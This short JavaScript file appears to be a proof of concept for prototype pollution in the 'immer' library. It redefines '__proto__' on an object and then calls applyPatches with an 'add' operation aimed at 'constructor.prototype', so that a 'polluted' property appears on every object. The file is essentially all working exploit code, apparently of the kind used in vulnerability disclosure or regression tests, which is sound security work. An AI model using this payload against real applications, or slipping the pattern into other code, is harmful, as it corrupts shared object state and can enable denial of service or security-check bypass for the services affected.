var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {applyPatches, enablePatches} = require('immer');
enablePatches();
applyPatches(obj, [{
        op: 'add',
        path: [
            'constructor.prototype',
            'polluted'
        ],
        value: 'yes'
    }]);
console.log({}.polluted);